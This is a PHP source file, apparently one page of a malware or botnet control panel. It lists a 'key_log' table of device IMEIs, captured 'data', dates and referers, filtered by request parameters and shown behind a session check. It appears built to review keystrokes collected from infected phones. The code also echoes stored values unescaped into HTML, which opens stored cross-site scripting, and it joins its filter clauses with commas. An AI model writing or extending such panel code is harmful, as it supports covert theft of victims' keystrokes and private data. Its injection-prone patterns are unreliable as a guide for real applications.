<?php session_start();
include '../db.php';
include '../crypt.php';
include 'func.php';
if (!(isset($_SESSION['user_id']))){
    header("Location: ../index.php"); 
    return; 
}  
?>
<?php
if ($_GET['sort'] == ""){
    $sort = 'info2';
}
else{
    $sort = $mysqli->real_escape_string($_GET['sort']);
}



if(empty($_GET["p"])){$_GET["p"]="1";}
$p=$mysqli->real_escape_string($_GET["p"]);

$where_sql = '';

if (isset($_GET["imei"]))$where_sql .= "IMEI REGEXP '".$mysqli->real_escape_string($_GET["imei"])."',";
if (isset($_GET["referer"]))$where_sql .= "referer REGEXP '".$mysqli->real_escape_string($_GET["referer"])."',";

if ($where_sql){
    $where_sql = rtrim($where_sql, ",");
} else {
    $where_sql = "1";
}

$select_sql = "SELECT * FROM `key_log` WHERE $where_sql";    
$select_sql_res = $mysqli->query($select_sql);
$users_on_page="20";

$count = $select_sql_res->num_rows;

$total = ceil($count / $users_on_page);


$html = '';
$html_table = '';

while ($row = mysqli_fetch_assoc($select_sql_res)) {
    #var_dump($guest);
    $id = $row["id"];
    $imei = $row["IMEI"];
    $data = $row["data"];
    $date_unix = $row["date"];
    $date = gmdate("Y-m-d\TH:i:s\Z", $date_unix);;
    $referer = $row["referer"];


    $html_table .= "<tr>";
    $html_table .= "<td>$id</td>
                    <td>$imei</td>
                    <td>$data</td>
                    <td>$date</td>
                    <td>$referer</td>";
    
    $html_commands .= "</tr>";
}




$html = file_get_contents("templates/keylog.tpl");
$html = str_replace('%%PLACE_TOTAL_ITEMS_HERE%%', $count, $html);
$html = str_replace('%%PLACE_TABLE_HERE%%', $html_table, $html);
//$html = str_replace('%%PLACE_FORM1_HERE%%', $html_form1, $html);
$html = str_replace('%%PLACE_BOTTOM_LINKS_HERE%%', pages_bottom("keylog",$total,$p,$sort), $html);

echo $html;

?>

